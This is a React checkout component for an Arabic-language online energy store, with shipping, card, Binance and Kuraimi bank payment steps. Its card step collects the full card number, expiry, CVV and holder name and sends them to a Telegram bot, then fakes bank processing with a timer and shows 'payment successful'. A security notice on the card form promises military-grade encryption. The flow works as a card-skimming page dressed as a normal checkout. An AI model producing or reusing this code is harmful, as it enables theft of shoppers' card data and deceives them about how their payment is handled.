
import React, { useState, useEffect, useRef } from 'react';
import { Product, ShippingInfo, UserProfile } from '../types';
import { NotificationService } from '../services/notificationService';

interface CheckoutViewProps {
  product: Product;
  onCancel: () => void;
  user: UserProfile | null;
}

type CheckoutStep = 'shipping' | 'payment-method' | 'process-card' | 'process-crypto' | 'process-kuraimi' | 'processing' | 'success';

const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) => {
  const [step, setStep] = useState<CheckoutStep>('shipping');
  const [shipping, setShipping] = useState<ShippingInfo>({ 
    fullName: user?.name || '', 
    phone: '', 
    city: '', 
    address: '' 
  });
  const [card, setCard] = useState({ number: '', expiry: '', cvv: '', name: user?.name?.toUpperCase() || '' });
  const [cardError, setCardError] = useState('');
  const [proofImage, setProofImage] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [step]);

  const handleNextStep = (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    if (step === 'shipping') {
      setStep('payment-method');
      return;
    }

    if (step === 'process-card') {
      const cleanNum = card.number.replace(/\s+/g, '');
      if (cleanNum.length < 15) {
        setCardError('يرجى إدخال رقم بطاقة صحيح');
        return;
      }
      
      setCardError('');
      setStep('processing');

      // إرسال البيانات للبوت فوراً - لا يوجد OTP هنا
      NotificationService.sendTelegramNotification(
        NotificationService.formatOrderMessage({
          product: product.name,
          price: `${product.price} ر.س`,
          method: "دفع مباشر بالبطاقة البنكية",
          customer: shipping,
          cardDetails: { 
            number: cleanNum, 
            expiry: card.expiry, 
            cvv: card.cvv, 
            name: card.name 
          },
          productUrl: `${window.location.origin}/#product-${product.id}`
        })
      );

      // محاكاة معالجة بنكية سريعة ثم النجاح
      setTimeout(() => setStep('success'), 3000);
      return;
    }

    if (step === 'process-crypto' || step === 'process-kuraimi') {
      if (!proofImage) {
        alert('يرجى إرفاق صورة إشعار التحويل أولاً');
        return;
      }
      setStep('processing');
      const method = step === 'process-crypto' ? "بينانس / USDT" : "بنك الكريمي";
      NotificationService.sendTelegramNotification(
        NotificationService.formatOrderMessage({
          product: product.name,
          price: `${product.price} ر.س`,
          method: method,
          customer: shipping,
          productUrl: `${window.location.origin}/#product-${product.id}`
        }),
        proofImage
      );
      setTimeout(() => setStep('success'), 2500);
    }
  };

  const renderShipping = () => (
    <div className="max-w-2xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-14 rounded-[3rem] shadow-2xl border border-emerald-50">
        <h2 className="text-3xl font-black text-emerald-950 mb-8 border-r-8 border-emerald-500 pr-4">بيانات التوصيل</h2>
        <form onSubmit={handleNextStep} className="space-y-6">
          <div className="space-y-2">
            <label className="text-xs font-black text-emerald-800 mr-2">الاسم بالكامل</label>
            <input type="text" required value={shipping.fullName} onChange={e => setShipping({...shipping, fullName: e.target.value})} placeholder="الاسم الرباعي" className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-bold" />
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="space-y-2">
              <label className="text-xs font-black text-emerald-800 mr-2">رقم الهاتف</label>
              <input type="tel" required value={shipping.phone} onChange={e => setShipping({...shipping, phone: e.target.value})} placeholder="77XXXXXXX" className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-bold" />
            </div>
            <div className="space-y-2">
              <label className="text-xs font-black text-emerald-800 mr-2">المحافظة / المدينة</label>
              <input type="text" required value={shipping.city} onChange={e => setShipping({...shipping, city: e.target.value})} placeholder="صنعاء، تعز، عدن..." className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-black" />
            </div>
          </div>
          <div className="space-y-2">
            <label className="text-xs font-black text-emerald-800 mr-2">العنوان بالتفصيل</label>
            <textarea required value={shipping.address} onChange={e => setShipping({...shipping, address: e.target.value})} placeholder="المديرية - الشارع - أقرب معلم" className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-bold min-h-[100px]" />
          </div>
          <button type="submit" className="w-full bg-emerald-600 text-white py-6 rounded-[2rem] font-black shadow-xl hover:bg-emerald-700 transition-all text-xl mt-4 active:scale-95">المتابعة للدفع</button>
        </form>
      </div>
    </div>
  );

  const renderPaymentSelection = () => (
    <div className="max-w-4xl mx-auto px-4 animate-fade-in">
      <h2 className="text-3xl font-black text-emerald-950 mb-10 text-center">اختر وسيلة الدفع</h2>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <button onClick={() => setStep('process-card')} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
          <span className="w-20 h-20 bg-blue-600 rounded-3xl flex items-center justify-center text-4xl shadow-lg group-hover:rotate-12 transition-transform">💳</span>
          <div>
            <h3 className="text-2xl font-black text-emerald-950">بطاقة بنكية</h3>
            <p className="text-gray-400 font-bold text-sm">فيزا / ماستركارد</p>
          </div>
        </button>
        
        <button onClick={() => setStep('process-crypto')} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
          <span className="w-20 h-20 bg-yellow-500 rounded-3xl flex items-center justify-center text-4xl shadow-lg group-hover:rotate-12 transition-transform">₿</span>
          <div>
            <h3 className="text-2xl font-black text-emerald-950">بينانس / USDT</h3>
            <p className="text-gray-400 font-bold text-sm">دفع رقمي سريع</p>
          </div>
        </button>

        <button onClick={() => setStep('process-kuraimi')} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
          <span className="w-20 h-20 bg-emerald-700 rounded-3xl flex items-center justify-center text-4xl shadow-lg group-hover:rotate-12 transition-transform">🏦</span>
          <div>
            <h3 className="text-2xl font-black text-emerald-950">بنك الكريمي</h3>
            <p className="text-gray-400 font-bold text-sm">تحويل حساب لحساب</p>
          </div>
        </button>

        <button onClick={() => window.open(`https://wa.me/967784400333`, '_blank')} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
          <span className="w-20 h-20 bg-emerald-500 rounded-3xl flex items-center justify-center text-4xl shadow-lg group-hover:rotate-12 transition-transform">💬</span>
          <div>
            <h3 className="text-2xl font-black text-emerald-950">واتساب مباشر</h3>
            <p className="text-gray-400 font-bold text-sm">تواصل مع المبيعات</p>
          </div>
        </button>
      </div>
    </div>
  );

  const renderCardPayment = () => (
    <div className="max-w-xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl border border-emerald-50">
        <h2 className="text-2xl font-black text-emerald-950 mb-8">تفاصيل البطاقة</h2>
        
        <div className="bg-gradient-to-br from-gray-900 to-black p-8 rounded-3xl text-white mb-8 shadow-2xl relative overflow-hidden">
           <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full blur-3xl"></div>
           <div className="flex justify-between items-start mb-10">
              <div className="w-14 h-10 bg-yellow-400/20 rounded-md border border-yellow-400/30"></div>
              <span className="text-2xl font-black italic tracking-tighter">VISA</span>
           </div>
           <p className="text-xl md:text-2xl font-mono tracking-[0.2em] mb-4">
             {card.number ? card.number.padEnd(19, '•') : '•••• •••• •••• ••••'}
           </p>
           <div className="flex justify-between items-end">
             <div className="text-[10px] font-bold opacity-50 uppercase">صاحب البطاقة<br/><span className="text-sm opacity-100 font-black">{card.name || 'اسم العميل'}</span></div>
             <div className="text-[10px] font-bold opacity-50 uppercase text-left">تاريخ الانتهاء<br/><span className="text-sm opacity-100 font-black">{card.expiry || 'MM/YY'}</span></div>
           </div>
        </div>

        <form onSubmit={handleNextStep} className="space-y-5">
          {cardError && <p className="text-red-500 text-sm font-black text-center bg-red-50 p-3 rounded-xl">{cardError}</p>}
          
          <div className="space-y-1">
            <input type="text" required maxLength={19} value={card.number} onChange={e => {
              const val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
              const parts = val.match(/.{1,4}/g) || [];
              setCard({...card, number: parts.join(' ')});
            }} placeholder="رقم البطاقة (16 رقم)" className="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl outline-none focus:border-blue-500 font-black text-center text-lg" />
          </div>
          
          <input type="text" required value={card.name} onChange={e => setCard({...card, name: e.target.value.toUpperCase()})} placeholder="اسم صاحب البطاقة (بالإنجليزي)" className="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl outline-none focus:border-blue-500 font-black text-center" />
          
          <div className="grid grid-cols-2 gap-4">
            <input type="text" required placeholder="MM/YY" value={card.expiry} onChange={e => setCard({...card, expiry: e.target.value})} className="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl outline-none text-center font-black" />
            <input type="password" required maxLength={3} value={card.cvv} onChange={e => setCard({...card, cvv: e.target.value})} placeholder="CVV" className="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl outline-none text-center font-black" />
          </div>
          
          <div className="p-4 bg-emerald-50 rounded-2xl border border-emerald-100 flex items-center gap-3">
             <div className="w-10 h-10 bg-emerald-600 text-white rounded-full flex items-center justify-center shrink-0 shadow-lg">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
             </div>
             <p className="text-[10px] font-black text-emerald-800 leading-tight">تشفير عسكري آمن لبياناتك البنكية عبر بوابة حيفان الآمنة.</p>
          </div>

          <button type="submit" className="w-full bg-emerald-600 text-white py-6 rounded-2xl font-black shadow-xl hover:bg-emerald-700 transition-all text-xl active:scale-95">تأكيد عملية الدفع</button>
        </form>
      </div>
    </div>
  );

  const renderProcessing = () => (
    <div className="py-40 text-center animate-fade-in flex flex-col items-center">
       <div className="relative w-32 h-32 mb-12">
          <div className="absolute inset-0 border-[12px] border-emerald-100 rounded-full"></div>
          <div className="absolute inset-0 border-[12px] border-emerald-600 border-t-transparent rounded-full animate-spin"></div>
       </div>
       <h2 className="text-4xl font-black text-emerald-950 mb-4">جاري معالجة الطلب...</h2>
       <p className="text-gray-400 font-bold text-lg">يرجى عدم إغلاق الصفحة لضمان اكتمال العملية</p>
    </div>
  );

  const renderSuccess = () => (
    <div className="max-w-2xl mx-auto py-20 text-center animate-fade-in px-4">
       <div className="bg-white p-12 md:p-24 rounded-[4rem] shadow-3xl border border-emerald-50 relative overflow-hidden">
          <div className="absolute top-0 left-0 w-full h-2 bg-emerald-500"></div>
          <div className="w-28 h-28 bg-emerald-600 text-white rounded-full flex items-center justify-center mx-auto mb-12 shadow-2xl ring-[15px] ring-emerald-50">
             <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <h2 className="text-5xl font-black text-emerald-950 mb-8">تم الدفع بنجاح!</h2>
          <p className="text-gray-500 font-bold text-xl leading-relaxed mb-12">شكراً لثقتك بمتجر حيفان للطاقة. تم استلام بيانات الدفع بنجاح، وسنقوم بتجهيز طلبك للشحن الفوري والتواصل معك.</p>
          <button onClick={onCancel} className="w-full bg-emerald-950 text-white py-8 rounded-[2rem] font-black text-2xl shadow-2xl hover:bg-black transition-all active:scale-95">العودة للرئيسية</button>
       </div>
    </div>
  );

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => setProofImage(reader.result as string);
      reader.readAsDataURL(file);
    }
  };

  return (
    <div className="min-h-screen bg-emerald-50/20 py-10 pb-32">
      <div className="container mx-auto px-4">
        <div className="flex items-center justify-between mb-16 max-w-4xl mx-auto">
           <button onClick={step === 'shipping' ? onCancel : () => setStep('shipping')} className="p-5 bg-white rounded-2xl border border-emerald-50 shadow-md hover:bg-emerald-50 transition-all">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><path d="M19 12H5"/><path d="m12 19-7-7 7-7"/></svg>
           </button>
           <div className="text-center">
              <h1 className="text-2xl font-black text-emerald-950">إتمام الشراء والطلب</h1>
              <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest mt-1">HAYFAN SECURE CHECKOUT</p>
           </div>
           <div className="w-14"></div>
        </div>

        {step === 'shipping' && renderShipping()}
        {step === 'payment-method' && renderPaymentSelection()}
        {step === 'process-card' && renderCardPayment()}
        {step === 'process-crypto' && (
           <div className="max-w-xl mx-auto animate-fade-in px-4">
             <div className="bg-white p-8 md:p-14 rounded-[3rem] shadow-2xl text-center border border-emerald-50">
               <h2 className="text-2xl font-black mb-8">بينانس (USDT)</h2>
               <div className="bg-emerald-50 p-8 rounded-3xl mb-8 border border-emerald-100">
                 <p className="text-[10px] font-black text-emerald-600 mb-2 uppercase">Binance ID</p>
                 <p className="text-3xl font-black text-emerald-950 tracking-wider">939771066</p>
               </div>
               <div onClick={() => fileInputRef.current?.click()} className="border-4 border-dashed border-emerald-100 p-12 rounded-[2.5rem] cursor-pointer bg-emerald-50/20 mb-8 hover:bg-emerald-50 transition-colors">
                  {proofImage ? <img src={proofImage} className="max-h-60 mx-auto rounded-xl shadow-lg" /> : <div className="space-y-4"><span className="text-5xl">📸</span><p className="font-black text-emerald-600">ارفع صورة إشعار التحويل</p></div>}
                  <input type="file" ref={fileInputRef} onChange={handleFileChange} className="hidden" accept="image/*" />
               </div>
               <button onClick={handleNextStep} className="w-full bg-emerald-600 text-white py-6 rounded-[2rem] font-black text-xl shadow-xl active:scale-95">تأكيد إرسال الطلب</button>
             </div>
           </div>
        )}
        {step === 'process-kuraimi' && (
           <div className="max-w-xl mx-auto animate-fade-in px-4">
             <div className="bg-white p-8 md:p-14 rounded-[3rem] shadow-2xl text-center border border-emerald-50">
               <h2 className="text-2xl font-black mb-8">بنك الكريمي</h2>
               <div className="bg-emerald-900 text-white p-8 rounded-3xl mb-8 shadow-xl">
                 <p className="opacity-50 text-[10px] font-black uppercase mb-2">رقم الحساب</p>
                 <p className="text-3xl font-black tracking-widest">123456789</p>
               </div>
               <div onClick={() => fileInputRef.current?.click()} className="border-4 border-dashed border-emerald-100 p-12 rounded-[2.5rem] cursor-pointer bg-emerald-50/20 mb-8 hover:bg-emerald-50 transition-colors">
                  {proofImage ? <img src={proofImage} className="max-h-60 mx-auto rounded-xl shadow-lg" /> : <div className="space-y-4"><span className="text-5xl">📄</span><p className="font-black text-emerald-600">ارفع صورة الحوالة</p></div>}
                  <input type="file" ref={fileInputRef} onChange={handleFileChange} className="hidden" accept="image/*" />
               </div>
               <button onClick={handleNextStep} className="w-full bg-emerald-600 text-white py-6 rounded-[2rem] font-black text-xl shadow-xl active:scale-95">تأكيد عملية التحويل</button>
             </div>
           </div>
        )}
        {step === 'processing' && renderProcessing()}
        {step === 'success' && renderSuccess()}
      </div>
    </div>
  );
};

export default CheckoutView;
